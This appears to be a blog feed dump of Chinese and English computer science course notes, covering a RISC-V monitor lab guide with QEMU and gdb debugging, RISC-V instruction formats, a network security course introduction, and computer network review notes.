class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当处理器和 Kernel 支持异常功能时 (即上文所述 <code>EN_INT=y</code>), 用户还可以用 Syscall 的方式打印字符. 打印字符的系统调用号为 30. 使用时, 用户把调用号保存在 s0 寄存器, 打印字符参数保存在 a0 寄存器, 并执行 syscall 指令, a0 寄存器的低八位将作为字符打印. 例如: </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">li s0, 30           # 系统调用号li a0, 0x4F         # 'O'ecallli a0, 0x4B         # 'K'ecalljr ra<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用 <code>A</code> 命令输入的汇编指令支持常见的伪指令 (pseudo instructions), 并且地址也会相应地变化, 如:</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">connecting to 127.0.0.1:6666...connectedrunning in 32bit, xlen = 4&gt;&gt; Aaddr: 0x80100000one instruction per line, empty line to end.[0x80100000] li a0, 0x12345678[0x80100008] li t0, 0x23333332[0x80100010] ret[0x80100014]&gt;&gt; Uaddr: 0x80100000num: 200x80100000:     12345537        lui     a0,0x123450x80100004:     67850513        addi    a0,a0,16560x80100008:     233332b7        lui     t0,0x233330x8010000c:     33228293        addi    t0,t0,8180x80100010:     00008067        ret&gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是 RV64, 上面的 <code>addi</code> 指令会相应地变成 <code>addiw</code> 指令. </p><h2 id="在-QEMU-里调试监控程序"><a href="#在-QEMU-里调试监控程序" class="headerlink" title="在 QEMU 里调试监控程序"></a>在 QEMU 里调试监控程序</h2><p>在 Makefile 中提供了 <code>debug</code> 目标, 它会编译 kernel 并且运行 QEMU: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">cd</span> kernel$ <span class="token function">make</span> debugqemu-system-riscv32 <span class="token parameter variable">-M</span> virt <span class="token parameter variable">-m</span> 32M <span class="token parameter variable">-kernel</span> kernel.elf <span class="token parameter variable">-nographic</span> <span class="token parameter variable">-monitor</span> stdio <span class="token parameter variable">-serial</span> tcp::6666,server <span class="token parameter variable">-S</span> <span class="token parameter variable">-s</span>QEMU <span class="token number">5.0</span>.0 monitor - <span class="token builtin class-name">type</span> <span class="token string">'help'</span> <span class="token keyword">for</span> <span class="token function">more</span> information<span class="token punctuation">(</span>qemu<span class="token punctuation">)</span> qemu-system-riscv32: <span class="token parameter variable">-serial</span> tcp::6666,server: info: QEMU waiting <span class="token keyword">for</span> connection on: disconnected:tcp::::6666,server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后它会在 6666 端口上等待 term 的连接. 另起一个窗口, 运行 term 连接到 <code>localhost:6666</code>: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python3 term/term.py <span class="token parameter variable">-t</span> <span class="token number">127.0</span>.0.1:6666 <span class="token parameter variable">-c</span>connecting to <span class="token number">127.0</span>.0.1:6666<span class="token punctuation">..</span>.connected<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这一步连上以后, 就可以用 gdb 挂载到 qemu 里的 kernel 上了. 采用<strong>比较新</strong>的 gdb 或者 SiFive 的 riscv64-elf-unknown-gdb (Windows 最好用这个) 都是可以的. 命令: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ riscv64-unknown-elf-gdb kernel/kernel.elfGNU gdb <span class="token punctuation">(</span>SiFive GDB <span class="token number">8.3</span>.0-2019.08.0<span class="token punctuation">)</span> <span class="token number">8.3</span>Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2019</span> Free Software Foundation, Inc.License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">&gt;</span>This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type <span class="token string">"show copying"</span> and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details.This GDB was configured as <span class="token string">"--host=x86_64-w64-mingw32 --target=riscv64-unknown-elf"</span><span class="token builtin class-name">.</span>Type <span class="token string">"show configuration"</span> <span class="token keyword">for</span> configuration details.For bug reporting instructions, please see:<span class="token operator">&lt;</span>https://github.com/sifive/freedom-tools/issues<span class="token operator">&gt;</span>.Find the GDB manual and other documentation resources online at:    <span class="token operator">&lt;</span>http://www.gnu.org/software/gdb/documentation/<span class="token operator">&gt;</span>.For help, <span class="token builtin class-name">type</span> <span class="token string">"help"</span><span class="token builtin class-name">.</span>Type <span class="token string">"apropos word"</span> to search <span class="token keyword">for</span> commands related to <span class="token string">"word"</span><span class="token punctuation">..</span>.Reading symbols from kernel/kernel.elf<span class="token punctuation">..</span>.<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> target remote localhost:1234Remote debugging using localhost:12340x00001000 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后就可以正常进行调试. </p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>CPU 采用的 RISC-V 指令集标准: The RISC-V Instruction Set Manual Volume I: User-Level ISA Document</li><li>RISC-V 中断及 Sv32/Sv39 等特权态资源: The RISC-V Instruction Set Manual Volume II: Privileged Architecture</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记1</title>
      <link href="/2023/09/19/ji-suan-ji-zu-cheng-yuan-li-bi-ji-1/"/>
      <url>/2023/09/19/ji-suan-ji-zu-cheng-yuan-li-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机指令系统"><a href="#计算机指令系统" class="headerlink" title="计算机指令系统"></a>计算机指令系统</h1><h2 id="Risc-V-指令"><a href="#Risc-V-指令" class="headerlink" title="Risc-V 指令"></a>Risc-V 指令</h2><h3 id="U-型"><a href="#U-型" class="headerlink" title="U 型"></a>U 型</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012440.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012441.png" alt=""></p><ul><li><strong>lui</strong> 和 <strong>auipc</strong> 主要用于构造大的常量数值和链接.</li><li><strong>lui</strong> 设置寄存器高位立即数, 用两条指令便可以任意偏移量转移控制流或者加载任意 32 位数据.<ul><li>将 <strong>lui</strong> 中的 20 位立即数与 <strong>jalr</strong> 中 12 位立即数组合, 可以将执行流转移到任何 32 位绝对地址.</li><li><strong>lui</strong> 加上标准的立即指令, 可构造一个任意 32 位常量.</li></ul></li><li><strong>auipc</strong> 向 PC 高位加上立即数, 仅用两条指令便可以基于当前 PC 以任意偏移量转移控制流或者访问数据.<ul><li>将 <strong>auipc</strong> 中的 20 位立即数与 <strong>jalr</strong> 中 12 位立即数组合, 可以将执行流转移到任何 32 位 PC 相对地址.</li><li><strong>auipc</strong> 加上普通加载或存储指令中的 12 位立即数偏移量, 可以访问任何 32 位 PC 相对地址的数据.</li></ul></li></ul><h3 id="UJ-J-型"><a href="#UJ-J-型" class="headerlink" title="UJ/J 型"></a>UJ/J 型</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012442.png" alt=""></p><ul><li><strong>J</strong> 类型的直接字段在 <strong>U</strong> 类型的基础上旋转了 12 位. 这可以降低指令信号扇出和立即数多路复用的成本, 并简化低端实现中的数据通路逻辑.</li><li>由于指令长度必须是两个字节的倍数, <strong>J</strong> 格式的分支和跳转地址必须向左移动 1 位以将地址乘以 2, 给予分支和跳转指令更大的跳转范围, 进行符号扩展后再添加到 PC 上, 得到跳转地址.</li><li><strong>jal</strong> 具有双重功能. 若将下一条指令 PC + 4 的地址保存到目标寄存器中.<ul><li>通常是返回地址寄存器 ra, 便可实现过程调用.</li><li>使用零寄存器 x0 替换 ra 作为目标寄存器, 则可实现无条件跳转. </li></ul></li></ul><h3 id="I-型-1"><a href="#I-型-1" class="headerlink" title="I 型 - 1"></a>I 型 - 1</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012443.png" alt=""></p><ul><li>跳转链接指令的寄存器版本 <strong>jalr</strong> 同样是多用途的.<ul><li>可以调用地址是动态计算出来的函数.</li><li>可以实现调用返回 (ra 作为源寄存器, x0 作为目的寄存器).</li><li>switch 和 case 语句的地址跳转也可使用 <strong>jalr</strong> 指令, 目的寄存器设为 x0.</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012444.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012445.png" alt=""></p><h3 id="I-型-2"><a href="#I-型-2" class="headerlink" title="I 型 - 2"></a>I 型 - 2</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012446.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013730.png" alt=""><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013731.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013732.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013733.png" alt=""></p><ul><li><strong>slli</strong> 和 <strong>srli</strong> 的 shamt[4:0] 为移动量, 范围都是[4:0], 因为在 RV32I 中最大的移位量是 31 位.</li><li>imm[10] 用来区分移位类型, 其中 <strong>slli</strong> 和 <strong>srli</strong> 指令机器码的 bit 30 为 0, 而 <strong>srai</strong> 指令机器码的 bit 30 为 1.</li></ul><h3 id="R-型"><a href="#R-型" class="headerlink" title="R 型"></a>R 型</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013734.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013735.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013736.png" alt=""><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013737.png" alt=""></p><h3 id="S-型"><a href="#S-型" class="headerlink" title="S 型"></a>S 型</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013738.png" alt=""><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013739.png" alt=""></p><h3 id="SB-B-型"><a href="#SB-B-型" class="headerlink" title="SB/B 型"></a>SB/B 型</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013740.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302013741.png" alt=""></p><ul><li><strong>B</strong> 类型的立即数字段在 <strong>S</strong> 类型的基础上旋转了 1 位. 这可以降低指令信号扇出和立即数多路复用的成本, 并简化低端实现中的数据通路逻辑.</li><li>由于指令长度必须是两个字节的倍数, <strong>B</strong> 格式的分支和跳转地址必须向左移动 1 位以将地址乘以 2, 给予分支和跳转指令更大的跳转范围, 进行符号扩展后再添加到 PC 上, 得到跳转地址.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Organization &amp; Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Organization &amp; Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络安全技术 笔记1</title>
      <link href="/2023/09/17/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-1/"/>
      <url>/2023/09/17/ji-suan-ji-wang-luo-an-quan-ji-zhu-bi-ji-1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、课程概论"><a href="#一、课程概论" class="headerlink" title="一、课程概论"></a>一、课程概论</h1><h2 id="无处不在的通信"><a href="#无处不在的通信" class="headerlink" title="无处不在的通信"></a>无处不在的通信</h2><h3 id="人类的基本需求"><a href="#人类的基本需求" class="headerlink" title="人类的基本需求"></a>人类的基本需求</h3><ul><li><p>通信的基本要素: 信源、信道、信宿.</p></li><li><p>三网合一:</p><ul><li><p>一个多世纪前——电信网络;</p></li><li><p>半个多世纪前——计算机网络;</p></li><li><p>单向广播式的网络——有线电视网.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657170.png" alt=""></p></li></ul></li></ul><h3 id="电信网的发展历程"><a href="#电信网的发展历程" class="headerlink" title="电信网的发展历程"></a>电信网的发展历程</h3><h4 id="有线电报"><a href="#有线电报" class="headerlink" title="有线电报"></a>有线电报</h4><ul><li><p>电磁电报机:</p><ul><li>基本技术条件: 电池、铜线、电磁感应器.</li><li>通过专用的交换线路以电信号发送信息.</li></ul></li><li><p>摩尔斯电码:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657171.png" style="zoom:25%;"></p></li><li><p>局限性: 手续麻烦, 不能及时双向交流信息.</p><ul><li>发送: 报文译成电码, 电报机发送;</li><li>接收: 电码译成报文, 送到收报人.</li></ul></li></ul><h4 id="电话"><a href="#电话" class="headerlink" title="电话"></a>电话</h4><ul><li><p>送话器: 声音变成电信号.</p><ul><li>贝尔送话器: 电磁感应, 贝尔获得发明电话专利.</li><li>格雷送话器: 液体电阻的变化;</li><li>爱迪生送话器: 活性炭的振动.</li></ul></li><li><p>受话器: 电信号变成声音. </p><ul><li>电磁感应.</li></ul></li><li><p>传输导线: 铜; 电话线: 双绞线.</p></li><li><p>步进制交换机问世, 标志交换技术从人工时代迈入机电交换时代.</p></li><li><p>由计算机控制的程控电话交换机在美国问世, 标志着电话新时代的开始.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657172.png" alt=""></p></li><li><p>局限性: 电信号通过金属线传送的, 信息无法无线传播.</p></li></ul><h4 id="无线电报"><a href="#无线电报" class="headerlink" title="无线电报"></a>无线电报</h4><ul><li>科学家的努力:<ul><li>电磁感应: 麦克斯韦.</li><li>电磁能量越过空间传播: 赫兹 (无线电技术萌芽).</li><li>无线电通信创始人: 俄国人波波夫和意大利人马可尼.</li><li>无线电广播之父: 美国人巴纳特•史特波斐德.</li></ul></li><li>二战是基于无线电的信息战.</li><li>电子管——对讲无线电样机; 晶体管——专用无线电话系统.</li></ul><h4 id="移动电话"><a href="#移动电话" class="headerlink" title="移动电话"></a>移动电话</h4><ul><li><p>载波: 振荡器产生, 在通讯信道上传输, 调制后传送语音或数据.</p></li><li><p>贝尔实验室: 提出小区制、蜂窝组网理论, 改变了移动通信发展史.</p></li><li><p>AMPS: 先进移动电话业务系统, 第一个具有随时随地通信能力的大容量蜂窝移动通信系统.</p></li><li><p>蜂窝移动通信系统: 由交换网路子系统 (NSS), 无线基站子系统 (BSS) 和移动台 (MS) 组成.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657173.png" alt=""></p></li><li><p>移动通讯:</p><ul><li>1G: 面向语音的模拟无线系统, FDMA 技术.<ul><li>美国 AMPS、欧洲 TACS.</li></ul></li><li>2G: 面向语音的数字无线系统, TDMA 或窄带 CDMA 技术.<ul><li>欧洲 GSM、北美 IS-54 和 IS-95、日本 JDC.</li></ul></li><li>3G: 用分组交换数据业务综合在高语音质量、容量、速率的网络系统.<ul><li>W-CDMA 和 CDMA2000.</li></ul></li><li>4G: 提高无线访问速率与无线通信速度.<ul><li>TD-LTE 和 FDD-LTE.</li></ul></li></ul></li></ul><h3 id="计算机网络的发展历程"><a href="#计算机网络的发展历程" class="headerlink" title="计算机网络的发展历程"></a>计算机网络的发展历程</h3><h4 id="计算机孤岛"><a href="#计算机孤岛" class="headerlink" title="计算机孤岛"></a>计算机孤岛</h4><ul><li>1950 年前: 没有网络, 计算成本昂贵, 资源不能共享.</li></ul><h4 id="终端出现"><a href="#终端出现" class="headerlink" title="终端出现"></a>终端出现</h4><ul><li><p>1954 年: 终端出现, 收发器终端, 通过电话线传输, 打孔卡片上的数据发送到远地计算机.</p></li><li><p>计算机网络的基本原型: 星型拓扑结构.</p><ul><li>集中式结构;</li><li><p>集中控制、脆弱性高.</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657174.png" alt="image-2240101170919845" style="zoom: 50%;"></p></li></ul></li></ul><h4 id="计算机和计算机互联"><a href="#计算机和计算机互联" class="headerlink" title="计算机和计算机互联"></a>计算机和计算机互联</h4><ul><li><p>第一代计算机网络: 主机——通信线路——终端, 多个用户共享资源服务.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657175.png" alt="image-20240101171143776" style="zoom: 25%;"></p></li><li><p>ARPANET:</p><ul><li>传送方式: 存储转发;</li><li>通信技术: 分组交换;</li><li>网络结构划分: 通信子网, 资源子网;</li><li>组成元素:<ul><li>接口报文处理机 IMP;</li><li>主机 Host;</li><li>分组 Packet;</li></ul></li><li>计算机网络的结构、概念发生变化.</li></ul></li></ul><h4 id="网络与网络互联"><a href="#网络与网络互联" class="headerlink" title="网络与网络互联"></a>网络与网络互联</h4><ul><li>网络互连特征: 网络体系结构的形成, 网络协议的标准化.</li><li>Internet 诞生标志: 采用标准统一的 TCP/IP 协议.</li><li>计算机网络: 地理位置分散, 具有独立功能的多个计算机系统, 利用通信设备和传输介质互相连接, 配以相应的网络软件, 实现数据通信和资源共享.</li><li>逻辑功能 (物理连接):<ul><li>资源子网 (计算机系统, 进行数据处理);</li><li>通信子网 (通信链路和网络节点, 提供通信功能).</li></ul></li></ul><h2 id="无处不在的安全"><a href="#无处不在的安全" class="headerlink" title="无处不在的安全"></a>无处不在的安全</h2><ul><li>信息安全变革:<ul><li>计算机的应用;</li><li>分布式系统、网络的应用.</li></ul></li><li>核心技术难题:<ul><li>路由劫持;</li><li>路由泄露;</li><li>源地址伪造.</li></ul></li><li>诈骗产业链:<ul><li>漏洞挖掘、代码编写、信息窃取、信息贩卖、窃取诈骗.</li></ul></li><li>信息窃取:<ul><li>蛮力破解攻击:<ul><li>字典文件, 提高攻击成功几率; 撞库攻击.</li></ul></li><li>中间人攻击:<ul><li>网络链路间, 进行数据监听和数据篡改.</li></ul></li><li>拒绝服务攻击:<ul><li>压跨或使计算机崩溃, 阻止提供服务, 最容易实施的且最为有效.</li><li>SYN 洪泛, UDP 洪泛, DNS 反射.</li></ul></li><li>病毒攻击:<ul><li>利用系统、软件的漏洞运行, 或伪装成正常程序.</li></ul></li></ul></li></ul><h2 id="揭开现象看本质"><a href="#揭开现象看本质" class="headerlink" title="揭开现象看本质"></a>揭开现象看本质</h2><ul><li><p>Arthur: 加密机 Enigma.</p><ul><li><p>多表代换密码.</p></li><li><p>转轮式: 防止字频统计, 增加可能的不重复方向.</p></li><li><p>反射器: 使译码过程和编码过程完全一样.</p></li><li><p>连接板: 增加加密可能性.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406301657177.png" alt=""></p></li></ul></li><li><p>Turing: 破译机 Bomber.</p><ul><li>继电器构成, 80 个电子管, 光电阅读器读入密码.</li></ul></li><li><p>Turing Machine:</p><ul><li>图灵机: 完全虚拟, 忽略硬件因素, 思考焦点是逻辑结构.</li><li>阿坦纳索夫: 第一台电子计算机 ABC, 图灵机的第一个硬件实现.</li><li>冯·诺依曼: 功能更好、用途更广的通用电子计算机.</li><li>图灵: 《机器能思考吗》, 提出人工智能的概念.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Network Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络原理 期末复习</title>
      <link href="/2023/06/13/ji-suan-ji-wang-luo-yuan-li-qi-mo-fu-xi/"/>
      <url>/2023/06/13/ji-suan-ji-wang-luo-yuan-li-qi-mo-fu-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Computer-Network-Final-Notes"><a href="#Computer-Network-Final-Notes" class="headerlink" title="Computer Network Final Notes"></a>Computer Network Final Notes</h1><blockquote><p><em>Some useful (maybe) facts are first shown.</em></p></blockquote><ul><li><p><strong>Protocal Stack</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008774.png" alt=""></p></li><li><p><strong>Turing Award</strong></p><ul><li><strong>Bob Metcalfe</strong>: Father of Ethernet</li><li><strong>Vinton G. Cerf &amp; Robert E. Kahn</strong>: TCP/IP</li><li><strong>Tim Berners-Lee</strong>: Web &amp; HTTP</li></ul></li></ul><blockquote><p><em>Now comes the crazy things!</em></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="Connect-end-systems-to-edge-router"><a href="#Connect-end-systems-to-edge-router" class="headerlink" title="Connect end systems to edge router"></a>Connect end systems to edge router</h3><ul><li><strong>Residential</strong> access networks</li><li><strong>Institutional</strong> access networks (school, company)</li><li><strong>Mobile</strong> access networks (WiFi, 4G/5G)<ul><li><strong>Wireless local</strong> area networks<ul><li>802.11 (WiFi)</li></ul></li><li><strong>Wide-area cellular</strong> access networks<ul><li>4G cellular networks</li></ul></li></ul></li></ul><h3 id="Links-physical-media"><a href="#Links-physical-media" class="headerlink" title="Links physical media"></a>Links physical media</h3><ul><li><strong>Twisted pair</strong> (TP)</li><li><strong>Coaxial cable</strong></li><li><strong>Fiber optic cable</strong><ul><li>high-speed operation</li><li><strong>low error rate</strong></li></ul></li><li><strong>Wireless radio</strong><ul><li>no physical “wire”</li><li><strong>broadcast</strong>, “half-duplex”</li><li><strong>propagation environment effects</strong></li></ul></li></ul><h3 id="Packet-switching"><a href="#Packet-switching" class="headerlink" title="Packet switching"></a>Packet switching</h3><ul><li><strong>On-demand allocation</strong><ul><li>Store-and-forward</li><li>Great for “bursty” data</li><li><strong>Resource sharing</strong></li></ul></li></ul><h3 id="Circuit-switching"><a href="#Circuit-switching" class="headerlink" title="Circuit switching"></a>Circuit switching</h3><ul><li><strong>Reserved resources</strong><ul><li>Dedicated, <strong>no resource sharing</strong></li><li>FDMA and TDMA</li></ul></li></ul><h3 id="Network-of-networks"><a href="#Network-of-networks" class="headerlink" title="Network of networks"></a>Network of networks</h3><ul><li><p><strong>Global Transit ISP</strong></p></li><li><p><strong>Content Provider Network</strong> (<strong>bypassing tier-1, regional ISPs</strong>)</p></li><li><p><strong>Internet Exchange Point</strong></p></li><li><p>Regional ISP</p></li><li><p>Access ISP</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008775.png" alt=""></p></li></ul><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><ul><li><p>Delay:</p><script type="math/tex; mode=display">  d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}</script></li><li><p><strong>Throughput</strong>: <strong>bottleneck link</strong> on end-end path that constrains throughput</p></li></ul><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h3><ul><li><strong>Packet Sniffing</strong>:<ul><li><strong>broadcast</strong> media (shared Ethernet, wireless)</li><li>promiscuous network interface reads/records all packets</li></ul></li><li><strong>IP spoofing</strong>:<ul><li>injection of packet with false source address</li></ul></li><li><strong>Denial of Service</strong>:<ul><li>overwhelme resource with bogus traffic</li><li>make resources (server, bandwidth) unavailable</li></ul></li></ul><h2 id="Application-layer"><a href="#Application-layer" class="headerlink" title="Application layer"></a>Application layer</h2><h3 id="Network-app"><a href="#Network-app" class="headerlink" title="Network app"></a>Network app</h3><ul><li>Run on <strong>end systems</strong></li><li>Not run on <strong>network-core devices</strong></li><li>(<strong>Network layer protocols</strong> in every Internet device: <strong>hosts, routers</strong>)</li></ul><h3 id="Client-server-paradigm"><a href="#Client-server-paradigm" class="headerlink" title="Client-server paradigm"></a>Client-server paradigm</h3><ul><li>Server:<ul><li>permanent IP address</li><li>often in data centers, for scaling</li></ul></li><li>Client:<ul><li><strong>intermittently</strong> connected</li><li><strong>dynamic IP addresses</strong></li><li>do <strong>not communicate directly</strong> with each other</li></ul></li><li>Examples: <strong>HTTP, IMAP, FTP</strong></li></ul><h3 id="Peer-peer-architecture"><a href="#Peer-peer-architecture" class="headerlink" title="Peer-peer architecture"></a>Peer-peer architecture</h3><ul><li>Peer:<ul><li><strong>intermittently</strong> connected</li><li><strong>dynamic IP addresses</strong></li><li>arbitrary end systems <strong>directly communicate</strong></li><li><strong>self scalability</strong> – new peers bring new service capacity and service demands</li></ul></li><li>Example: <strong>P2P file sharing</strong></li></ul><h3 id="TSL"><a href="#TSL" class="headerlink" title="TSL"></a>TSL</h3><ul><li><strong>Application-layer protocal</strong>, Provides <strong>encrypted TCP connections</strong></li></ul><h3 id="HTTP-Hypertext-Transfer-Protocol"><a href="#HTTP-Hypertext-Transfer-Protocol" class="headerlink" title="HTTP (Hypertext Transfer Protocol)"></a>HTTP (Hypertext Transfer Protocol)</h3><ul><li><p>Web’s <strong>Application-layer protocol</strong>, use <strong>TCP</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008776.png" alt=""></p></li><li><p><strong>Stateless</strong>: server maintains no information about past client requests</p></li><li><p>Developments:</p><ul><li>HTTP 1.1:<ul><li><strong>persistent</strong> HTTP</li><li>multiple, pipelined GETs over single TCP connection</li><li><strong>FCFS</strong> scheduling, <strong>HOL</strong> <strong>blocking</strong></li><li>loss recovery stalls object transmission</li></ul></li><li>HTTP/2:<ul><li>transmission order based on client-specified <strong>priority</strong>, interleaved</li><li>divide objects into frames, <strong>mitigate HOL blocking</strong></li><li>loss recovery stalls object transmission</li></ul></li><li>HTTP/3:<ul><li>adds <strong>security</strong>, per object error- &amp; congestion-control (more pipelining) <strong>over UDP</strong></li></ul></li></ul></li></ul><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><ul><li><p>Components:</p><ul><li>header line of <strong>HTTP response message</strong></li><li>header line in next <strong>HTTP request message</strong></li><li>file kept on <strong>user’s host</strong>, managed by user’s browser</li><li><p>back-end <strong>database at web site</strong></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008777.png" alt=""></p></li></ul></li><li><p>Used for:</p><ul><li>authorization</li><li>recommendations</li><li>user session state</li></ul></li><li><p><strong>GDPR</strong> (EU General Data Protection Regulation)</p></li></ul><h3 id="Web-caches"><a href="#Web-caches" class="headerlink" title="Web caches"></a>Web caches</h3><ul><li><p>Acts as <strong>both client and server</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009875.png" alt=""></p></li><li><p>Browser caching: <strong>Conditional GET</strong></p></li><li><p>Pros:</p><ul><li>reduce <strong>end-end response time</strong></li><li>reduce <strong>traffic</strong> on institution’s <strong>access link</strong></li><li>enables content providers to <strong>effectively deliver content</strong></li></ul></li></ul><h3 id="SMTP-Simple-Mail-Transfer-Protocol"><a href="#SMTP-Simple-Mail-Transfer-Protocol" class="headerlink" title="SMTP (Simple Mail Transfer Protocol)"></a>SMTP (Simple Mail Transfer Protocol)</h3><ul><li>E-mail’s <strong>Application-layer protocol</strong>, use <strong>TCP</strong></li><li>Use <strong>persistent connections</strong></li><li>Comparison:<ul><li>HTTP<ul><li>client <strong>pull</strong></li><li>each object encapsulated in its own response message</li></ul></li><li>SMTP<ul><li>client <strong>push</strong></li><li>multiple objects sent in multipart message</li></ul></li></ul></li><li><strong>Mail access protocol</strong>: retrieval from server<ul><li><strong>IMAP</strong> (Internet Mail Access Protocol)</li><li><strong>POP</strong></li><li><strong>HTTP</strong></li></ul></li></ul><h3 id="DNS-Domain-Name-System"><a href="#DNS-Domain-Name-System" class="headerlink" title="DNS (Domain Name System)"></a>DNS (Domain Name System)</h3><ul><li><strong>Application-layer protocol</strong>, <strong>distributed</strong> and <strong>hierarchical</strong> database</li><li><p>Services:</p><ul><li>hostname to IP address translation</li><li>host aliasing<ul><li>canonical, alias names</li></ul></li><li>mail server aliasing</li><li><strong>load distribution</strong><ul><li><strong>replicated IP addresses</strong> correspond to <strong>one name</strong></li></ul></li></ul></li><li><p><strong>Decentralized</strong>:</p><ul><li><strong>single point of failure</strong></li><li><strong>traffic volume</strong></li><li><strong>distant</strong> centralized database</li><li><strong>maintenance</strong></li></ul></li><li><strong>DNSSEC</strong> – provides security</li><li><strong>ICANN</strong> - manages root DNS domain</li><li><strong>Local</strong> DNS server:<ul><li>local cache of recent translation pairs</li><li>doesn’t strictly belong to hierarchy</li><li><strong>forwarding request into DNS hierarchy</strong></li><li>TLD servers typically cached, <strong>allowing root server 